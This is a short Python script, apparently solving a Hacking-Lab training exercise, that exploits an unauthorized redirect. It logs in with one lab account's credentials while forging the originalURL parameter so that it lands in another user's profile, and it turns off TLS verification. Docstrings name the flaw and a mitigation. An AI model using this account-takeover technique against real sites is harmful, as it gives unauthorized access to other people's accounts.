__problem__ = \
"""
Server redirects URL without authorization.
"""

__attack__ = \
"""
Login with own account but redirect to other user's account.
"""

__mitigation__ = \
"""
User input's validation. Authorization.
"""

import logging

import requests

log = logging.getLogger(__name__)


def hmmm():
    with requests.session() as session:
        session.verify = False
        response = session.get(
            "https://glocken.hacking-lab.com/12001/url_case4/url4/controller?action=showpage&page=navigate")
        redirected_url = response.url
        cookie = redirected_url.split("&AValue=")[1]
        r = session.post(f"https://glocken.hacking-lab.com/12001/url_case4/auth_url4/login",
                         data={
                             'username': 'hacker10',
                             'password': "compass",
                             'action': 'login',
                             'send': 'Login',
                             'AValue': cookie,
                             'originalURL': f"https://glocken.hacking-lab.com/12001/url_case4/url4/controller?action=profile&pid=2&AValue={cookie}"
                         })
        print("Enter the link in the site to access to hacker11's account: " + r.text)


if __name__ == '__main__':
    setup_log(False)
    hmmm()
